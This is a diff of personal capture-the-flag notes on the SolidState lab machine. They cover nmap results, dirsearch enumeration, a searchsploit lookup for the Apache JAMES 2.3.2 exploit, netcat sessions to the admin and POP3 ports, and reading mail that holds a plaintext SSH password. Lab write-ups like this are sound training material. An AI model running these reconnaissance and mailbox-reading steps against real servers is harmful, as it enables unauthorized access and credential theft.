@@ -34,6 +34,13 @@
         110/tcp open  pop3    JAMES pop3d 2.3.2
         119/tcp open  nntp    JAMES nntpd (posting ok)
         Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    # 80 is open, get the domain name is solid-state-security.com
+    # add solid-state-security.com and www.solid-state-security.com to IP in the /etc/hosts file. 
+    # this action may discover new things.
+    
+    # emulate the directions of the site
+        dirsearch -u http://IP
+        dirsearch -u xx -w /usr/share/seclists/Discovery/Web-Content/xx  # like big.txt  
 
     searchsploit james
         -------------------------------------------------------------------------------------- ---------------------------------
@@ -47,16 +54,16 @@
         -------------------------------------------------------------------------------------- ---------------------------------
         Shellcodes: No Results
 
-    under 35513.py a port 4555 shoud be connected which is used in the script.
+    under 35513.py a port 4555 may be connected which is used in the script.
         nc -nv IP 4555
 
-        nc -nvC 172.16.33.35 110 #connect to the pop3 server on port 110
+        nc -nvC 172.16.33.35 110 #connect to the pop3 server on port 110 # C add a "\r" at the end of a command for nc
             Connection to 172.16.33.35 110 port [tcp/*] succeeded!
             +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
 
             user XX
             pass XX
-            list
+            list    
             retr $    # a email
                 retr 2
                         +OK Message follows
@@ -82,6 +89,8 @@
 
                         username: mindy
                         pass: P@55W0rd1!2@
+            #ssh mindy to the target
+            #
 
 
 
